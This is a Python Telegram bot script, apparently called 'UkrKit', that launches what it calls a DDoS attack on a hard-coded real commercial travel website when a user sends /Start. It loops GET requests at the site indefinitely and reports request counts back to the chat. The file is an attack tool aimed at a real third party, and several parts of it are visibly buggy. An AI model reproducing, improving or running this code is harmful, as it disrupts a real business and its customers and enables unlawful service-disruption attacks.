from telegram.ext import Updater, MessageHandler, Filters, CallbackQueryHandler,  CommandHandler
import os, requests, time

class UkrKit(object):
    _instance = None

    def __new__(cls):
        if not hasattr(cls, '_inst'):
            UkrKit._instance = super(UkrKit, cls).__new__(cls)
            return UkrKit._instance

    def __init__(self):
        self.updater = Updater(os.getenv("TOKEN"), use_context=True)
        self.SvynogoriaServices = ["https://anex-tour.ru/"]
        self.CountSvynogoriaServices = 0
        self.dispatcher = self.updater.dispatcher
        self.chat_id = ""
        self.CreateHandler()
        self.run()

    def CreateHandler(self):
        self.dispatcher.add_handler(CommandHandler("Start", UkrKit.Start))

    def run(self):
        self.updater.start_polling(timeout=1990000, poll_interval=1)
        self.updater.idle()


    @classmethod
    def Start(self, update, context):
        kit = UkrKit._instance
        self.chat_id = update.message.chat_id
        context.bot.send_message(update.message.chat_id, "Start DDOS attack {0}"
                                 .format(kit.SvynogoriaServices[kit.CountSvynogoriaServices]))
        kit.AttackSvynogoria()

    def AttackSvynogoria(self):
        num = 0
        last_num = 0
        while True:
            try:
                req = requests.get(self.SvynogoriaServices[0])
                time.sleep(2)
                print(req)
                num += 1
                if last_num + 50 < num and last_num != 0:
                    last_num = num
                    if self.chat_id != 0:
                        self.dispatcher.context.bot.send_message(self.chat_id, "DDOS was succses by {0} req".format(num))
            except: pass

UkrKit()